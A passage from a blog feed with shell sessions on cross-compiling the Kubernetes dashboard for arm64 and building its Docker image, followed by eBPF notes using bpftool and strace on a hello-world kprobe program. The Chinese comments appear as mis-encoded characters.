class="hljs-string">&#x27;v2.4.0&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by performing another checkout.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -b with the checkout <span class="hljs-built_in">command</span> again. Example:<br><br>  git checkout -b &lt;new-branch-name&gt;<br><br>HEAD is now at e75ebcf68 Prepare <span class="hljs-keyword">for</span> v2.4.0 release (<span class="hljs-comment">#6536)</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># ls</span><br>aio           code-of-conduct.md  cypress       docs    go.sum             i18n     license-checker-config.json  OWNERS_ALIASES  package-lock.json  ROLES.md           SECURITY.md  tsconfig.json<br>angular.json  CONTRIBUTING.md     cypress.json  go.mod  gulpfile.babel.js  LICENSE  OWNERS                       package.json    README.md          SECURITY_CONTACTS  src<br>[root@ningan dashboard]<span class="hljs-comment">#</span><br>[root@ningan dashboard]<span class="hljs-comment"># cd src</span><br>[root@ningan src]<span class="hljs-comment"># ls</span><br>app<br>[root@ningan src]<span class="hljs-comment"># cd app/</span><br>[root@ningan app]<span class="hljs-comment"># ls</span><br>backend  frontend<br>[root@ningan app]<span class="hljs-comment"># cd backend/</span><br>[root@ningan backend]<span class="hljs-comment"># ls</span><br>api  args  auth  cert  client  dashboard.go  errors  handler  integration  plugin  resource  scaling  settings  <span class="hljs-built_in">sync</span>  systembanner  validation<br>[root@ningan backend]<span class="hljs-comment">#</span><br><br><br><span class="hljs-comment">############################ 3.ç¼–è¯‘armäºŒè¿›åˆ¶ ############################</span><br>[root@ningan backend]<span class="hljs-comment"># GOOS=linux GOARCH=arm64 go build  -o bin/dashboard-arm ./dashboard.go</span><br>[root@ningan backend]<span class="hljs-comment">#</span><br>[root@ningan backend]<span class="hljs-comment"># cd bin</span><br>[root@ningan bin]<span class="hljs-comment"># ll</span><br>total 49880<br>drwxr-xr-x  2 root root     4096 Jul 13 15:36 ./<br>drwxr-xr-x 18 root root     4096 Jul 13 15:36 ../<br>-rwxr-xr-x  1 root root 51063857 Jul 13 15:36 dashboard-arm*<br><br><br><span class="hljs-comment">############################ 4.ç¼–å†™Dockerfile ############################</span><br>[root@ningan bin]<span class="hljs-comment"># cat Dockerfilearm</span><br>FROM xxx   <span class="hljs-comment"># æ­¤å¤„å†™æˆè‡ªå·±çš„ä¸€ä¸ªarmåŸºç¡€é•œåƒ</span><br><br>ADD ./dashboard-arm /dashboard<br>USER root<br>EXPOSE 8443 9090<br>ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br><br><span class="hljs-comment">############################ 5.æ„å»ºé•œåƒ ############################</span><br>[root@ningan bin]<span class="hljs-comment"># docker build -t dashboard:v2.4.0-arm64 . -f Dockerfilearm</span><br>Sending build context to Docker daemon  51.07MB<br>Step 1/5 : FROM xxx/istio/csm_stg/src_image_build/base_go:1.16<br> ---&gt; 3ad4565d534b<br>Step 2/5 : ADD ./dashboard-arm /dashboard<br> ---&gt; 7e3d77933b5a<br>Step 3/5 : USER root<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in 2d9408e745f1</span><br><span class="hljs-string">Removing intermediate container 2d9408e745f1</span><br><span class="hljs-string"> ---&gt; 177800207a1e</span><br><span class="hljs-string">Step 4/5 : EXPOSE 8443 9090</span><br><span class="hljs-string"> ---&gt; [Warning] The requested image&#x27;</span>s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested<br> ---&gt; Running <span class="hljs-keyword">in</span> 932853d116b3<br>Removing intermediate container 932853d116b3<br> ---&gt; 7ea9c1c8d5e5<br>Step 5/5 : ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in ce7ee0cc5586</span><br><span class="hljs-string">Removing intermediate container ce7ee0cc5586</span><br><span class="hljs-string"> ---&gt; e14cdf3553f3</span><br><span class="hljs-string">Successfully built e14cdf3553f3</span><br><span class="hljs-string">Successfully tagged dashboard:v2.4.0-arm64</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">############################ 6.æµ‹è¯• ############################</span><br><span class="hljs-string">å¯åŠ¨æ˜¯å¯ä»¥æˆåŠŸå¯åŠ¨äº†ï¼Œä½†æ˜¯ä¸€ç›´é‡å¯ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>4</title>
    <link href="/2023/10/31/ebpf/04/"/>
    <url>/2023/10/31/ebpf/04/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#### 04èŠ‚</span><br><span class="hljs-comment">###### bpftoolï¼Œç”¨å®ƒå¯ä»¥æŸ¥çœ‹ eBPF ç¨‹åºçš„è¿è¡ŒçŠ¶æ€</span><br><span class="hljs-comment"># æŸ¥è¯¢ç³»ç»Ÿä¸­æ­£åœ¨è¿è¡Œçš„ eBPF ç¨‹åº</span><br>sudo bpftool prog list  <br><span class="hljs-comment"># å¯¼å‡ºè¿™ä¸ª eBPF ç¨‹åºçš„æŒ‡ä»¤</span><br>sudo bpftool prog dump xlated <span class="hljs-built_in">id</span> 89<br><br>sudo bpftool prog dump jited <span class="hljs-built_in">id</span> 89<br><br><br><span class="hljs-comment"># è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨ -ebpfè¡¨ç¤ºåªè·Ÿè¸ªbpfç³»ç»Ÿè°ƒç”¨</span><br>strace -v -f -ebpf ./hello-opennat.py<br><br>strace -v -f ./hello-opennat.py<br><br><br>ç”¨é«˜çº§è¯­è¨€å¼€å‘çš„ eBPF ç¨‹åºï¼Œéœ€è¦é¦–å…ˆç¼–è¯‘ä¸º BPF å­—èŠ‚ç ï¼ˆå³ BPF æŒ‡ä»¤ï¼‰ï¼Œç„¶åå€ŸåŠ© bpf ç³»ç»Ÿè°ƒç”¨åŠ è½½åˆ°å†…æ ¸ä¸­ï¼Œæœ€åå†é€šè¿‡æ€§èƒ½ç›‘æ§ç­‰æ¥å£ï¼Œä¸å…·ä½“çš„å†…æ ¸äº‹ä»¶è¿›è¡Œç»‘å®šã€‚è¿™æ ·ï¼Œå†…æ ¸çš„æ€§èƒ½ç›‘æ§æ¨¡å—æ‰ä¼šåœ¨å†…æ ¸äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œæˆ‘ä»¬å¼€å‘çš„ eBPF ç¨‹åºã€‚<br><br><br></code></pre></td></tr></table></figure><h2 id="ç¯å¢ƒä¿¡æ¯"><a href="#ç¯å¢ƒä¿¡æ¯" class="headerlink" title="ç¯å¢ƒä¿¡æ¯"></a>ç¯å¢ƒä¿¡æ¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br></code></pre></td></tr></table></figure><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="BPF-æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ"><a href="#BPF-æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ" class="headerlink" title="BPF æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ"></a>BPF æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog list</span><br>...<br>170: kprobe  name hello_world  tag 38dd440716c4900f  gpl<br>        loaded_at 2023-01-29T22:53:07+0800  uid 0<br>        xlated 104B  jited 74B  memlock 4096B<br>        btf_id 103<br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump xlated id 170</span><br>int hello_world(void * ctx):<br>; int hello_world(void *ctx)<br>   0: (b7) r1 = 33<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // æœ€å¸¸ç”¨çš„ BPF è¾…åŠ©å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¾“å‡ºä¸€æ®µå­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œç”±äº eBPF è¿è¡Œåœ¨å†…æ ¸ä¸­ï¼Œå®ƒçš„è¾“å‡ºå¹¶ä¸æ˜¯é€šå¸¸çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè€Œæ˜¯å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe<br>   1: (6b) *(u16 *)(r10 -4) = r1<br>   2: (b7) r1 = 1684828783<br>   3: (63) *(u32 *)(r10 -8) = r1<br>   4: (18) r1 = 0x57202c6f6c6c6548<br>   6: (7b) *(u64 *)(r10 -16) = r1<br>   7: (bf) r1 = r10<br>;<br>   8: (07) r1 += -16<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // æœ€å¸¸ç”¨çš„ BPF è¾…åŠ©å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¾“å‡ºä¸€æ®µå­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œç”±äº eBPF è¿è¡Œåœ¨å†…æ ¸ä¸­ï¼Œå®ƒçš„è¾“å‡ºå¹¶ä¸æ˜¯é€šå¸¸çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè€Œæ˜¯å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe<br>   9: (b7) r2 = 14<br>  10: (85) call bpf_trace_printk<span class="hljs-comment">#-65424</span><br>; <span class="hljs-built_in">return</span> 0;<br>  11: (b7) r0 = 0<br>  12: (95) <span class="hljs-built_in">exit</span><br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump jited id 170</span><br>Error: No libbfd support<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool version -p</span><br>&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;5.15.74&quot;</span>,<br>    <span class="hljs-string">&quot;features&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;libbfd&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&quot;skeletons&quot;</span>: <span class="hljs-literal">false</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="eBPF-ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ"><a href="#eBPF-ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ" class="headerlink" title="eBPF ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ"></a>eBPF ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>strace: <span class="hljs-built_in">exec</span>: Permission denied<br>+++ exited with 1 +++<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># chmod +x hello.py</span><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>bpf(BPF_BTF_LOAD, &#123;btf=<span class="hljs-string">&quot;\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\315\t\0\0\0\0\0\0\0\0\0\2&quot;</span>..., btf_log_buf=NULL, btf_size=3197, btf_log_size=0, btf_log_level=0&#125;, 128) = 3<br>bpf(BPF_PROG_LOAD, &#123;prog_type=BPF_PROG_TYPE_KPROBE, insn_cnt=13, insns=[&#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x21&#125;, &#123;code=BPF_STX|BPF_H|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-4, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x646c726f&#125;, &#123;code=BPF_STX|BPF_W|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-8, imm=0&#125;, &#123;code=BPF_LD|BPF_DW|BPF_IMM, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x6c6c6548&#125;, &#123;code=BPF_LD|BPF_W|BPF_IMM, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x57202c6f&#125;, &#123;code=BPF_STX|BPF_DW|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-16, imm=0&#125;, &#123;code=BPF_ALU64|BPF_X|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_10, off=0, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_ADD, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0xfffffff0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_2, src_reg=BPF_REG_0, off=0, imm=0xe&#125;, &#123;code=BPF_JMP|BPF_K|BPF_CALL, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x6&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;, &#123;code=BPF_JMP|BPF_K|BPF_EXIT, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;], license=<span class="hljs-string">&quot;GPL&quot;</span>, log_level=0, log_size=0, log_buf=NULL, kern_version=KERNEL_VERSION(5, 15, 74), prog_flags=0, prog_name=<span class="hljs-string">&quot;hello_world&quot;</span>, prog_ifindex=0, expected_attach_type=BPF_CGROUP_INET_INGRESS, prog_btf_fd=3, func_info_rec_size=8, func_info=0x55cd34bb8700, func_info_cnt=1, line_info_rec_size=16, line_info=0x55cd34b42800, line_info_cnt=5, attach_btf_id=0, attach_prog_fd=0, fd_array=NULL&#125;, 128) = 4<br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.168992: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169022: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169047: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169050: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006685: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006702: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193472: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193486: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193711: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193712: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193806: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193807: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193900: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193902: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257082: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257119: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506782: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506819: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757435: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757476: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006600: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006637: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.203999: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204040: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204324: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204347: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204729: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.205191: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.205215: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] d...1 27979.212232: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] dN..1 27979.212317: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257070: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257121: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257315: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257323: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257356: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257357: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257426: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257428: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257496: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257497: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257515: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257516: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257626: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257627: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257699: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257700: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257717: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257732: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257733: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257748: bpf_trace_printk: Hello, World!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘ç¼–è¯‘</title>
    <link href="/2023/10/31/ebpf/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/"/>
    <url>/2023/10/31/ebpf/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/</url>
    
